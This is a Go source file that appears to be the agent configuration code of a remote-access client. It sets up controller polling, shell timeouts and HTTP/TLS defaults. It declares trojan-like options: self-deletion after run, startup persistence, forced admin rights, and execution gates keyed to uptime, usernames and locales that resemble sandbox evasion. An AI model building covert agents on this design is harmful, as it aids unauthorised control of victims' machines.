package agent

import (
	"crypto/tls"
	"errors"
	"log"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/rootbay/tenvy-client/internal/protocol"
)

const (
	statusOnline  = "online"
	statusOffline = "offline"

	defaultPollInterval    = 5 * time.Second
	defaultBackoff         = 30 * time.Second
	defaultShellTimeout    = 30 * time.Second
	defaultResultRetention = 1024
	defaultHotResultCache  = 50
)

// RuntimeOptions defines the dependencies and configuration required to run an
// agent instance.
type RuntimeOptions struct {
	Logger         *log.Logger
	HTTPClient     *http.Client
	ServerURL      string
	SharedSecret   string
	Preferences    BuildPreferences
	Metadata       protocol.AgentMetadata
	BuildVersion   string
	ShutdownGrace  time.Duration
	TimingOverride TimingOverride
	ResultStore    ResultStoreOptions
	Watchdog       WatchdogConfig
	Execution      ExecutionGates
	CustomHeaders  []CustomHeader
	CustomCookies  []CustomCookie
}

// TimingOverride allows build-time or environment overrides for default
// intervals used by the runtime.
type TimingOverride struct {
	PollInterval time.Duration
	MaxBackoff   time.Duration
	ShellTimeout time.Duration
}

// WatchdogConfig controls automatic agent restarts when unexpected errors occur.
type WatchdogConfig struct {
	Enabled  bool
	Interval time.Duration
}

// ExecutionGates defines runtime preconditions that must be satisfied before the
// agent begins communicating with the controller.
type ExecutionGates struct {
	Enabled          bool
	Delay            time.Duration
	MinUptime        time.Duration
	AllowedUsernames []string
	AllowedLocales   []string
	RequireInternet  bool
	StartAfter       *time.Time
	EndBefore        *time.Time
}

// CustomHeader represents an additional HTTP header to attach to controller
// requests.
type CustomHeader struct {
	Key   string
	Value string
}

// CustomCookie represents a cookie to attach to controller requests.
type CustomCookie struct {
	Name  string
	Value string
}

// BuildPreferences mirrors the build-time preferences that can be embedded in
// the binary.
type BuildPreferences struct {
	InstallPath   string
	MeltAfterRun  bool
	StartupOnBoot bool
	MutexKey      string
	ForceAdmin    bool
}

// ResultStoreOptions defines configuration for persisting command results.
type ResultStoreOptions struct {
	Path      string
	Retention int
	HotCache  int
}

func (o *ResultStoreOptions) ensureDefaults(pref BuildPreferences) {
	if strings.TrimSpace(o.Path) == "" {
		o.Path = defaultResultStorePath(pref)
	}
	if o.Retention <= 0 {
		o.Retention = defaultResultRetention
	}
	if o.HotCache <= 0 {
		o.HotCache = defaultHotResultCache
	}
}

// Validate verifies that all required runtime options have been provided.
func (o RuntimeOptions) Validate() error {
	if o.Logger == nil {
		return errors.New("runtime options missing logger")
	}
	if o.HTTPClient == nil {
		return errors.New("runtime options missing http client")
	}
	if strings.TrimSpace(o.ServerURL) == "" {
		return errors.New("runtime options missing server url")
	}
	if strings.TrimSpace(o.BuildVersion) == "" {
		return errors.New("runtime options missing build version")
	}
	return nil
}

// ensureDefaults configures derived default values for runtime options.
func (o *RuntimeOptions) ensureDefaults() {
	o.HTTPClient = ensureHTTPClient(o.HTTPClient)
	if o.ShutdownGrace <= 0 {
		o.ShutdownGrace = 5 * time.Second
	}
	o.ResultStore.ensureDefaults(o.Preferences)
	if o.Watchdog.Enabled && o.Watchdog.Interval <= 0 {
		o.Watchdog.Interval = time.Minute
	}
}

func ensureHTTPClient(base *http.Client) *http.Client {
	if base == nil {
		base = &http.Client{}
	} else {
		base = cloneHTTPClient(base)
	}

	if base.Timeout <= 0 {
		base.Timeout = 60 * time.Second
	}

	base.Transport = ensureHTTPTransport(base.Transport)
	return base
}

func ensureHTTPTransport(rt http.RoundTripper) http.RoundTripper {
	transport, ok := rt.(*http.Transport)
	switch {
	case ok:
		transport = transport.Clone()
	case rt == nil:
		defaultTransport, ok := http.DefaultTransport.(*http.Transport)
		if !ok {
			return rt
		}
		transport = defaultTransport.Clone()
	default:
		return rt
	}

	if transport.DialContext == nil {
		transport.DialContext = (&net.Dialer{Timeout: 15 * time.Second, KeepAlive: 30 * time.Second}).DialContext
	}
	if transport.MaxIdleConns < 32 {
		transport.MaxIdleConns = 32
	}
	if transport.MaxIdleConnsPerHost < 16 {
		transport.MaxIdleConnsPerHost = 16
	}
	if transport.IdleConnTimeout <= 0 {
		transport.IdleConnTimeout = 90 * time.Second
	}
	if transport.TLSHandshakeTimeout <= 0 {
		transport.TLSHandshakeTimeout = 10 * time.Second
	}
	if transport.ExpectContinueTimeout <= 0 {
		transport.ExpectContinueTimeout = time.Second
	}
	transport.ForceAttemptHTTP2 = true

	if transport.TLSClientConfig == nil {
		transport.TLSClientConfig = &tls.Config{MinVersion: tls.VersionTLS12}
	} else {
		cfg := transport.TLSClientConfig.Clone()
		if cfg.MinVersion < tls.VersionTLS12 {
			cfg.MinVersion = tls.VersionTLS12
		}
		transport.TLSClientConfig = cfg
	}
	return transport
}

func cloneHTTPClient(base *http.Client) *http.Client {
	if base == nil {
		return &http.Client{}
	}
	clone := *base
	return &clone
}
